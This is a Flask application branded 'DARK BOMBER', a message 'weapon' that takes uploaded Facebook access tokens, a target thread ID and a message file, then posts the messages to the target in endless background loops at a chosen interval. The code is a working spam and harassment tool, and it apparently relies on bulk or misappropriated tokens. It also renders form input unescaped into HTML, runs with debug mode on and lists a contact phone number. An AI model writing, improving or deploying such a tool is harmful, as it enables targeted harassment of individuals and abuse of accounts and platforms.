from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                try:
                    message = str(mn) + ' ' + message1
                    
                    # Send only text message
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {
                        'access_token': access_token,
                        'message': message
                    }
                    
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"✅ Message Sent Successfully From token {access_token}: {message}")
                    else:
                        print(f"❌ Message Sent Failed From token {access_token}: {message}")
                        print(f"Error: {response.text}")
                    
                except Exception as e:
                    print(f"🚨 Error sending message: {e}")
                
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        <div style="background: linear-gradient(135deg, #000000 0%, #ff0000 50%, #8b0000 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin: 20px; box-shadow: 0 0 80px #ff0000; border: 3px solid #ff0000; position: relative; overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, transparent 30%, rgba(255,0,0,0.1) 50%, transparent 70%); animation: scan 2s linear infinite;"></div>
            <div style="font-size: 100px; margin-bottom: 30px; text-shadow: 0 0 50px #ff0000;">⚡</div>
            <h3 style="margin: 0; font-size: 42px; font-weight: bold; text-shadow: 0 0 30px #ff0000; font-family: Orbitron, sans-serif;">MISSION ACTIVATED</h3>
            <p style="font-size: 28px; margin: 25px 0; color: #00ff00; font-family: Orbitron, sans-serif;">TASK ID: <strong style="color: #ff0000;">{task_id}</strong></p>
            <div style="background: rgba(255,0,0,0.2); padding: 25px; border-radius: 15px; margin: 25px 0; border: 2px solid #ff0000;">
                <p style="margin: 12px 0; font-size: 18px;">🎯 TARGET: {thread_id}</p>
                <p style="margin: 12px 0; font-size: 18px;">⏰ INTERVAL: {time_interval}s</p>
                <p style="margin: 12px 0; font-size: 18px;">🔑 TOKENS: {len(access_tokens)}</p>
            </div>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #ff0000, #8b0000); color: white; padding: 18px 35px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 25px; font-size: 20px; font-family: Orbitron, sans-serif; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 30px #ff0000;">🔥 RETURN TO CONTROL</a>
        </div>
        '''

    # Get active tasks count for display
    active_tasks = len(threads)
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>⚡ DARK BOMBER - ULTIMATE MESSAGE WEAPON ⚡</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Exo+2:wght@300;400;500;600;700;800&family=Montserrat:wght@300;400;500;600;700;800&family=Aldrich&family=Black+Ops+One&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --neon-red: #ff0000;
      --neon-blue: #00ffff;
      --neon-green: #00ff00;
      --neon-purple: #ff00ff;
      --dark-bg: #000000;
      --matrix-green: #00ff41;
      --cyber-yellow: #ffff00;
    }

    body {
      background: radial-gradient(circle at center, #0a0a0a 0%, #000000 70%);
      color: var(--neon-green);
      font-family: 'Orbitron', monospace;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }

    /* Matrix Rain Background */
    .matrix-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -3;
    }

    .matrix-char {
      position: absolute;
      color: var(--matrix-green);
      font-size: 18px;
      font-family: 'Courier New', monospace;
      animation: matrixFall linear infinite;
      text-shadow: 0 0 8px var(--matrix-green);
      opacity: 0.7;
    }

    @keyframes matrixFall {
      to {
        transform: translateY(100vh);
      }
    }

    /* Cyber Grid */
    .cyber-grid {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        linear-gradient(90deg, rgba(0,255,255,0.03) 1px, transparent 1px),
        linear-gradient(0deg, rgba(0,255,255,0.03) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: -2;
      animation: gridMove 20s linear infinite;
    }

    @keyframes gridMove {
      0% { transform: translate(0, 0); }
      100% { transform: translate(40px, 40px); }
    }

    /* Main Container */
    .cyber-container {
      max-width: 550px;
      margin: 30px auto;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(15px);
      border: 3px solid var(--neon-red);
      border-radius: 15px;
      padding: 40px;
      position: relative;
      box-shadow: 
        0 0 60px var(--neon-red),
        inset 0 0 100px rgba(255,0,0,0.1);
      animation: containerPulse 3s ease-in-out infinite alternate;
      overflow: hidden;
    }

    @keyframes containerPulse {
      0% {
        box-shadow: 0 0 60px var(--neon-red),
                   inset 0 0 100px rgba(255,0,0,0.1);
        border-color: var(--neon-red);
      }
      50% {
        box-shadow: 0 0 80px var(--neon-blue),
                   inset 0 0 100px rgba(0,255,255,0.1);
        border-color: var(--neon-blue);
      }
      100% {
        box-shadow: 0 0 60px var(--neon-purple),
                   inset 0 0 100px rgba(255,0,255,0.1);
        border-color: var(--neon-purple);
      }
    }

    .cyber-container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, transparent, rgba(255,0,0,0.1), transparent);
      animation: scan 4s linear infinite;
      transform: rotate(45deg);
    }

    @keyframes scan {
      0% { transform: rotate(45deg) translateX(-100%); }
      100% { transform: rotate(45deg) translateX(100%); }
    }

    /* Header */
    .cyber-header {
      text-align: center;
      margin-bottom: 40px;
      position: relative;
    }

    .main-title {
      font-family: 'Black Ops One', cursive;
      font-size: 4rem;
      background: linear-gradient(45deg, var(--neon-red), var(--neon-blue), var(--neon-purple));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 50px var(--neon-red);
      margin-bottom: 10px;
      animation: titleGlow 2s ease-in-out infinite alternate;
    }

    @keyframes titleGlow {
      0% { text-shadow: 0 0 50px var(--neon-red); }
      50% { text-shadow: 0 0 70px var(--neon-blue), 0 0 90px var(--neon-purple); }
      100% { text-shadow: 0 0 50px var(--neon-red); }
    }

    .subtitle {
      font-family: 'Orbitron', monospace;
      font-size: 1.3rem;
      color: var(--neon-green);
      text-transform: uppercase;
      letter-spacing: 4px;
      margin-bottom: 20px;
      text-shadow: 0 0 20px var(--neon-green);
    }

    /* Stats */
    .cyber-stats {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin: 30px 0;
    }

    .stat-card {
      background: rgba(255,0,0,0.1);
      border: 2px solid var(--neon-red);
      border-radius: 10px;
      padding: 20px;
      text-align: center;
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }

    .stat-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 30px var(--neon-red);
    }

    .stat-number {
      font-size: 2rem;
      font-weight: 900;
      color: var(--neon-red);
      display: block;
      text-shadow: 0 0 20px var(--neon-red);
    }

    .stat-label {
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      color: var(--neon-green);
      margin-top: 5px;
    }

    /* Input Styles */
    .cyber-input {
      background: rgba(0, 0, 0, 0.7);
      border: 2px solid var(--neon-red);
      border-radius: 8px;
      color: var(--neon-green);
      padding: 18px 20px;
      margin-bottom: 25px;
      transition: all 0.3s ease;
      font-size: 16px;
      font-family: 'Orbitron', monospace;
      width: 100%;
    }

    .cyber-input:focus {
      border-color: var(--neon-blue);
      box-shadow: 0 0 30px var(--neon-blue);
      outline: none;
      background: rgba(0, 0, 0, 0.9);
    }

    .cyber-select {
      background: rgba(0, 0, 0, 0.7);
      border: 2px solid var(--neon-red);
      border-radius: 8px;
      color: var(--neon-green);
      padding: 18px 20px;
      margin-bottom: 25px;
      transition: all 0.3s ease;
      font-family: 'Orbitron', monospace;
      width: 100%;
    }

    .cyber-select:focus {
      border-color: var(--neon-blue);
      box-shadow: 0 0 30px var(--neon-blue);
      outline: none;
    }

    /* Buttons */
    .cyber-btn {
      background: linear-gradient(45deg, var(--neon-red), #8b0000);
      border: 2px solid var(--neon-red);
      border-radius: 8px;
      color: white;
      padding: 20px 40px;
      font-weight: 900;
      font-size: 1.2rem;
      text-transform: uppercase;
      letter-spacing: 3px;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      margin: 20px 0;
      font-family: 'Orbitron', monospace;
      width: 100%;
      text-shadow: 0 0 10px rgba(255,255,255,0.5);
    }

    .cyber-btn:hover {
      transform: translateY(-3px);
      box-shadow: 
        0 0 40px var(--neon-red),
        0 0 80px rgba(255,0,0,0.3);
      color: white;
    }

    .cyber-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: 0.5s;
    }

    .cyber-btn:hover::before {
      left: 100%;
    }

    .cyber-btn-danger {
      background: linear-gradient(45deg, #8b0000, #ff0000);
      border-color: #ff0000;
    }

    /* File Upload */
    .file-upload-area {
      border: 3px dashed var(--neon-red);
      border-radius: 10px;
      padding: 30px;
      text-align: center;
      margin: 25px 0;
      transition: all 0.3s ease;
      background: rgba(255,0,0,0.05);
      cursor: pointer;
      position: relative;
      overflow: hidden;
    }

    .file-upload-area:hover {
      border-color: var(--neon-blue);
      background: rgba(0,255,255,0.05);
      box-shadow: 0 0 40px rgba(0,255,255,0.2);
      transform: scale(1.02);
    }

    /* Labels */
    .cyber-label {
      font-family: 'Orbitron', monospace;
      font-weight: 700;
      font-size: 1rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 12px;
      display: block;
      color: var(--neon-red);
      text-shadow: 0 0 10px var(--neon-red);
    }

    /* Footer */
    .cyber-footer {
      text-align: center;
      margin: 40px 0 20px;
      padding: 30px;
      background: rgba(255,0,0,0.1);
      border-radius: 15px;
      border: 2px solid var(--neon-red);
    }

    .social-icon {
      width: 60px;
      height: 60px;
      background: linear-gradient(45deg, var(--neon-red), var(--neon-purple));
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin: 0 15px;
      color: white;
      text-decoration: none;
      font-size: 24px;
      transition: all 0.3s ease;
      box-shadow: 0 0 20px var(--neon-red);
      position: relative;
      overflow: hidden;
    }

    .social-icon:hover {
      transform: scale(1.2) rotate(360deg);
      box-shadow: 0 0 40px var(--neon-blue);
    }

    /* Animations */
    @keyframes float {
      0%, 100% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-20px) rotate(1deg); }
    }

    .floating {
      animation: float 4s ease-in-out infinite;
    }

    /* Warning Effects */
    .warning-pulse {
      animation: warningPulse 1.5s ease-in-out infinite;
    }

    @keyframes warningPulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    /* Terminal Text */
    .terminal-text {
      font-family: 'Courier New', monospace;
      color: var(--matrix-green);
      text-shadow: 0 0 10px var(--matrix-green);
    }
  </style>
</head>
<body>
  <!-- Matrix Rain Background -->
  <div class="matrix-bg" id="matrixBg"></div>
  
  <!-- Cyber Grid -->
  <div class="cyber-grid"></div>

  <!-- Main Content -->
  <div class="container-fluid">
    <div class="cyber-header">
      <h1 class="main-title floating">
        ⚡ DARK BOMBER ⚡
      </h1>
      <p class="subtitle warning-pulse">
        ULTIMATE MESSAGE WEAPON SYSTEM
      </p>
      
      <!-- Cyber Features -->
      <div class="mt-4">
        <span class="stat-card" style="display: inline-block; margin: 5px;">
          <i class="fas fa-skull-crossbones"></i> DANGEROUS
        </span>
        <span class="stat-card" style="display: inline-block; margin: 5px;">
          <i class="fas fa-bolt"></i> INSTANT
        </span>
        <span class="stat-card" style="display: inline-block; margin: 5px;">
          <i class="fas fa-shield-alt"></i> STEALTH
        </span>
      </div>
    </div>

    <!-- Cyber Stats -->
    <div class="cyber-stats">
      <div class="stat-card">
        <span class="stat-number" id="activeTasks">{{ active_tasks }}</span>
        <span class="stat-label">ACTIVE MISSIONS</span>
      </div>
      <div class="stat-card">
        <span class="stat-number" id="successRate">100%</span>
        <span class="stat-label">SUCCESS RATE</span>
      </div>
      <div class="stat-card">
        <span class="stat-number" id="powerLevel">MAX</span>
        <span class="stat-label">POWER LEVEL</span>
      </div>
    </div>

    <!-- Cyber Control Panel -->
    <div class="cyber-container">
      <form method="post" enctype="multipart/form-data" id="mainForm">
        <!-- Token Option -->
        <div class="mb-4">
          <label class="cyber-label">🔑 WEAPON AUTHENTICATION</label>
          <select class="cyber-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
            <option value="single">SINGLE TOKEN</option>
            <option value="multiple">TOKEN ARSENAL</option>
          </select>
        </div>

        <!-- Single Token Input -->
        <div class="mb-4" id="singleTokenInput">
          <label class="cyber-label">🔐 SINGLE ACCESS TOKEN</label>
          <input type="text" class="cyber-input" id="singleToken" name="singleToken" placeholder="ENTER ACCESS TOKEN..." required>
        </div>

        <!-- Token File Input -->
        <div class="mb-4" id="tokenFileInput" style="display: none;">
          <label class="cyber-label">📁 TOKEN ARSENAL</label>
          <div class="file-upload-area" onclick="document.getElementById('tokenFile').click()">
            <i class="fas fa-file-upload fa-3x text-danger mb-3"></i>
            <p class="cyber-label">UPLOAD TOKEN ARSENAL</p>
            <p class="terminal-text small">.TXT FILE CONTAINING MULTIPLE ACCESS TOKENS</p>
            <input type="file" class="d-none" id="tokenFile" name="tokenFile" accept=".txt">
          </div>
        </div>

        <!-- Target UID -->
        <div class="mb-4">
          <label class="cyber-label">🎯 TARGET IDENTIFICATION</label>
          <input type="text" class="cyber-input" id="threadId" name="threadId" placeholder="ENTER TARGET UID..." required>
        </div>

        <!-- Hater Name -->
        <div class="mb-4">
          <label class="cyber-label">😈 ATTACK SIGNATURE</label>
          <input type="text" class="cyber-input" id="kidx" name="kidx" placeholder="ENTER ATTACKER NAME..." required>
        </div>

        <!-- Time Interval -->
        <div class="mb-4">
          <label class="cyber-label">⏰ ATTACK INTERVAL</label>
          <input type="number" class="cyber-input" id="time" name="time" placeholder="SECONDS BETWEEN STRIKES..." required min="1">
        </div>

        <!-- Messages File -->
        <div class="mb-4">
          <label class="cyber-label">💬 MESSAGE PAYLOAD</label>
          <div class="file-upload-area" onclick="document.getElementById('txtFile').click()">
            <i class="fas fa-missile fa-3x text-danger mb-3"></i>
            <p class="cyber-label">UPLOAD MESSAGE PAYLOAD</p>
            <p class="terminal-text small">.TXT FILE WITH MESSAGE ARSENAL</p>
            <input type="file" class="d-none" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
        </div>

        <!-- Launch Button -->
        <button type="submit" class="cyber-btn">
          ⚡ INITIATE ATTACK SEQUENCE
        </button>
      </form>

      <!-- Stop Mission -->
      <form method="post" action="/stop" class="mt-4">
        <div class="mb-4">
          <label class="cyber-label text-danger">🛑 EMERGENCY ABORT</label>
          <input type="text" class="cyber-input" id="taskId" name="taskId" placeholder="ENTER MISSION ID TO ABORT..." required>
        </div>
        <button type="submit" class="cyber-btn cyber-btn-danger">
          💥 TERMINATE MISSION
        </button>
      </form>
    </div>

    <!-- Cyber Footer -->
    <footer class="cyber-footer">
      <div class="mb-4">
        <a href="https://www.facebook.com/100064267823693" class="social-icon" target="_blank">
          <i class="fab fa-facebook-f"></i>
        </a>
        <a href="https://wa.me/+917543864229" class="social-icon" target="_blank">
          <i class="fab fa-whatsapp"></i>
        </a>
        <a href="https://t.me/yourtelegram" class="social-icon" target="_blank">
          <i class="fab fa-telegram-plane"></i>
        </a>
      </div>
      <p class="cyber-label mb-2">⚡ DARK BOMBER WEAPONS SYSTEM ⚡</p>
      <p class="terminal-text small">USE WITH EXTREME CAUTION • AUTHORIZED PERSONNEL ONLY</p>
    </footer>
  </div>

  <script>
    // Create Matrix Rain
    function createMatrixRain() {
      const matrixBg = document.getElementById('matrixBg');
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*';
      
      for (let i = 0; i < 100; i++) {
        const char = document.createElement('div');
        char.className = 'matrix-char';
        char.textContent = chars[Math.floor(Math.random() * chars.length)];
        char.style.left = Math.random() * 100 + 'vw';
        char.style.animationDuration = (Math.random() * 10 + 5) + 's';
        char.style.animationDelay = Math.random() * 5 + 's';
        matrixBg.appendChild(char);
      }
    }

    // Toggle token input
    function toggleTokenInput() {
      const tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption === 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }

    // File upload preview
    document.addEventListener('DOMContentLoaded', function() {
      createMatrixRain();
      
      // Add file name display
      const fileInputs = ['tokenFile', 'txtFile'];
      fileInputs.forEach(inputId => {
        const input = document.getElementById(inputId);
        if (input) {
          input.addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name;
            if (fileName) {
              const uploadArea = this.closest('.file-upload-area');
              const existingBadge = uploadArea.querySelector('.file-badge');
              if (existingBadge) existingBadge.remove();
              
              const badge = document.createElement('span');
              badge.className = 'stat-card file-badge';
              badge.style.marginTop = '15px';
              badge.style.background = 'rgba(0,255,255,0.2)';
              badge.style.borderColor = 'var(--neon-blue)';
              badge.textContent = fileName.length > 12 ? fileName.substring(0, 12) + '...' : fileName;
              uploadArea.appendChild(badge);
            }
          });
        }
      });

      // Add cyber sound effects on hover
      const buttons = document.querySelectorAll('.cyber-btn');
      buttons.forEach(btn => {
        btn.addEventListener('mouseenter', function() {
          // Simulate cyber sound with vibration
          btn.style.animation = 'vibration 0.1s linear';
          setTimeout(() => {
            btn.style.animation = '';
          }, 100);
        });
      });
    });

    // Cyber form submission
    document.getElementById('mainForm').addEventListener('submit', function(e) {
      const button = this.querySelector('button[type="submit"]');
      const originalText = button.innerHTML;
      button.innerHTML = '⚡ INITIATING ATTACK...';
      button.disabled = true;
      
      // Add loading animation
      button.style.background = 'linear-gradient(45deg, #00ffff, #0080ff)';
      button.style.boxShadow = '0 0 50px #00ffff';
      
      setTimeout(() => {
        button.innerHTML = originalText;
        button.disabled = false;
        button.style.background = '';
        button.style.boxShadow = '';
      }, 5000);
    });

    // Update stats with random fluctuations
    setInterval(() => {
      const stats = document.querySelectorAll('.stat-number');
      stats.forEach(stat => {
        const randomGlow = Math.random() * 20 + 10;
        stat.style.textShadow = `0 0 ${randomGlow}px var(--neon-red)`;
      });
    }, 1000);

    // Add terminal typing effect
    const terminalTexts = document.querySelectorAll('.terminal-text');
    terminalTexts.forEach(text => {
      const original = text.textContent;
      text.textContent = '';
      let i = 0;
      const typeWriter = () => {
        if (i < original.length) {
          text.textContent += original.charAt(i);
          i++;
          setTimeout(typeWriter, 50);
        }
      };
      setTimeout(typeWriter, 1000);
    });
  </script>
</body>
</html>
''', active_tasks=active_tasks)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        # Remove from threads dictionary
        if task_id in threads:
            del threads[task_id]
        return f'''
        <div style="background: linear-gradient(135deg, #000000 0%, #8b0000 50%, #ff0000 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin: 20px; box-shadow: 0 0 80px #ff0000; border: 3px solid #ff0000; position: relative; overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, transparent 30%, rgba(255,0,0,0.2) 50%, transparent 70%); animation: scan 1s linear infinite;"></div>
            <div style="font-size: 100px; margin-bottom: 30px; text-shadow: 0 0 50px #ff0000;">💥</div>
            <h3 style="margin: 0; font-size: 42px; font-weight: bold; text-shadow: 0 0 30px #ff0000; font-family: Orbitron, sans-serif;">MISSION TERMINATED</h3>
            <p style="font-size: 28px; margin: 25px 0; color: #00ff00; font-family: Orbitron, sans-serif;">TASK ID: <strong style="color: #ff0000;">{task_id}</strong> DESTROYED</p>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #ff0000, #8b0000); color: white; padding: 18px 35px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 25px; font-size: 20px; font-family: Orbitron, sans-serif; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 30px #ff0000;">🔥 RETURN TO CONTROL</a>
        </div>
        '''
    else:
        return f'''
        <div style="background: linear-gradient(135deg, #000000 0%, #8b0000 50%, #ff0000 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin: 20px; box-shadow: 0 0 80px #ff0000; border: 3px solid #ff0000; position: relative; overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, transparent 30%, rgba(255,0,0,0.2) 50%, transparent 70%); animation: scan 1s linear infinite;"></div>
            <div style="font-size: 100px; margin-bottom: 30px; text-shadow: 0 0 50px #ff0000;">❌</div>
            <h3 style="margin: 0; font-size: 42px; font-weight: bold; text-shadow: 0 0 30px #ff0000; font-family: Orbitron, sans-serif;">MISSION NOT FOUND</h3>
            <p style="font-size: 28px; margin: 25px 0; color: #00ff00; font-family: Orbitron, sans-serif;">INVALID TASK ID: <strong style="color: #ff0000;">{task_id}</strong></p>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #ff0000, #8b0000); color: white; padding: 18px 35px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 25px; font-size: 20px; font-family: Orbitron, sans-serif; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 30px #ff0000;">🔥 RETURN TO CONTROL</a>
        </div>
        '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
